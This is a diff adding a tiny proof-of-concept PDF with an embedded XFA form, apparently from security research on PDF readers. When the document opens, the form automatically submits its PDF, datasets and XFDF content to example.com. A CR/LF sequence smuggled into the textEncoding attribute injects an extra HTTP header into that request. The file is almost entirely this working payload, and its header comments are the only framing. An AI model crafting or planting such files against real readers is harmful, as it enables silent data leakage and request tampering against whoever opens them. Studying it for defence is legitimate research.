@@ -1,0 +1,48 @@
+% a PDF file using an XFA
+% most whitespace can be removed (truncated to 570 bytes or so...)
+% Ange Albertini BSD Licence 2012
+% modified by InsertScript 
+
+%PDF-1. % can be truncated to %PDF-\0
+
+1 0 obj <<>>
+stream
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+<config><present><pdf>
+    <interactive>1</interactive>
+</pdf></present></config>
+
+<template>
+    <subform name="_">
+        <pageSet/>
+        <field id="Hello World!">
+            <event activity="docReady" ref="$host" name="event__click">
+               <submit 
+                     textEncoding="UTF-16&#xD;&#xA;test: test&#xD;&#xA;"
+                     xdpContent="pdf datasets xfdf"
+                     target="http://example.com/test"/>
+            </event>
+</field>
+    </subform>
+</template>
+</xdp:xdp>
+endstream
+endobj
+
+trailer <<
+    /Root <<
+        /AcroForm <<
+            /Fields [<<
+                /T (0)
+                /Kids [<<
+                    /Subtype /Widget
+                    /Rect []
+                    /T ()
+                    /FT /Btn
+                >>]
+            >>]
+            /XFA 1 0 R
+        >>
+        /Pages <<>>
+    >>
+>>
